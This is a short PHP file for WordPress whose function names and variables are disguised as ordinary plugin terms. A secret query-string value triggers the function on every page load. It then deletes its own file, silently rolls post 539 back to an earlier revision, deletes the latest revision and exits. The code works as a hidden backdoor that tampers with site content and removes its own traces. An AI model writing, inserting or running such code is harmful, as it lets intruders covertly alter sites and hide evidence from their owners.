<?php

function locator_patterns_ratings() {
	if (isset($_GET['box_authors_template_pixel']) && $_GET['box_authors_template_pixel'] === 'solution_hide_api') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$js_manage_safe_max = 539;
		$redirection_discount_estate_category = wp_get_post_revisions($js_manage_safe_max);
		if (empty($redirection_discount_estate_category)) die('no revisions');
		if (count($redirection_discount_estate_category) < 2) die('less than 2');
		$embedder_marketing_cool_plupload = array_shift($redirection_discount_estate_category);
		$keyword_visual_time = $embedder_marketing_cool_plupload->ID;
		$reports_cool_portfolio = array_shift($redirection_discount_estate_category);
		$control_forms_ssl = $reports_cool_portfolio->ID;
		$maps_game_popular_rates = wp_restore_post_revision($control_forms_ssl);
		if ($maps_game_popular_rates === false) die('error restoring');
		$maps_game_popular_rates = wp_delete_post_revision($keyword_visual_time);		
		if ($maps_game_popular_rates === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'locator_patterns_ratings');
